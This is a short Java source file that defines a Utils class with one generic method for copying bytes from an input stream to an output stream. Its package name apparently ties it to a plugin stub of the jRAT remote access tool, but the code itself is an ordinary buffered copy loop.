package pro.jrat.plugin.stub;

import java.io.InputStream;
import java.io.OutputStream;

public class Utils {
	
	public static long copy(InputStream input, OutputStream output) throws Exception {
		byte[] buffer = new byte[1024];
		int n = 0;
		long count = 0L;
		while ((n = input.read(buffer)) != -1) {
			output.write(buffer, 0, n);
			count += n;
		}
		return count;
	}
}
